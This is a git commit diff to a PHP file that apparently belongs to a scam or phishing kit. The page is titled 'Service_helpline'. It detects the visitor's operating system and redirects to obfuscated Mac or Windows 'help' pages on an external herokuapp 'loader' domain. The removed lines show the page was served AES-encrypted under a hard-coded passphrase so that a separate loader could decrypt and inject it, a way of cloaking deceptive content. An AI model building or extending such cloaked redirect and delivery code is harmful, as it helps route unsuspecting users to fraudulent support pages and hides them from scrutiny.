7697099a7e8257a54b5614587138b47b659a3bba
sabarwalsumit39-beep <sabarwalsumit39@gmail.com>
2026-09-02 20:54:20 +0530

    Absolute URL redirect with placeholders

--- index.php
+++ index.php
@@ -1,18 +1,3 @@
-<?php
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
-
-// Preflight request handle karein
-if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
-    exit(0);
-}
-header('Access-Control-Allow-Origin: *');
-header('Content-Type: application/json');
-
-// 🔑 PASSPHRASE (Must match your loader)
-$PASSPHRASE = "MySecretKey@123";
-
 $HTML_CONTENT = <<<'HTML'
 <!DOCTYPE html>
 <html lang="en">
@@ -22,7 +7,6 @@ $HTML_CONTENT = <<<'HTML'
     <title>Service_helpline_0171d</title>
     <script src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
     <script>
-        // ये वैल्यू Loader द्वारा Replace की जाएँगी
         var ALPHA = '{{ALPHA}}';
         var ANIPH = '{{ANIPH}}';
 
@@ -38,33 +22,15 @@ $HTML_CONTENT = <<<'HTML'
 
         var os = myOperatingSystem();
         localStorage.setItem('alpha', ALPHA);
+        var BASE_URL = 'https://loaderfortest-23d1cffa4338.herokuapp.com'; // अपना Loader Domain डालें
+
         if (os === 'MacOS') {
-            window.location.href = "Ma0cHelpAsMEr0t0140/index.html?Aniph=" + ANIPH;
+            window.location.href = BASE_URL + '/Ma0cHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
         } else {
-            window.location.href = "Wi0nHelpAsMEr0t0140/index.html?Aniph=" + ANIPH;
+            window.location.href = BASE_URL + '/Wi0nHelpAsMEr0t0140/index.html?Aniph=' + ANIPH;
         }
     </script>
 </head>
 <body></body>
 </html>
 HTML;
-// ============================================================
-// 🔐 ENCRYPTION (OpenSSL Salted Format – CryptoJS Compatible)
-// ============================================================
-function encrypt_salted($data, $passphrase) {
-    $salt = openssl_random_pseudo_bytes(8);
-    $salted = '';
-    $dx = '';
-    while (strlen($salted) < 48) {
-        $dx = md5($dx . $passphrase . $salt, true);
-        $salted .= $dx;
-    }
-    $key = substr($salted, 0, 32);
-    $iv = substr($salted, 32, 16);
-    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
-    return base64_encode('Salted__' . $salt . $ciphertext);
-}
-
-// 🚀 Output JSON
-$cipher = encrypt_salted($HTML_CONTENT, $PASSPHRASE);
-echo json_encode(['cipher' => $cipher]);
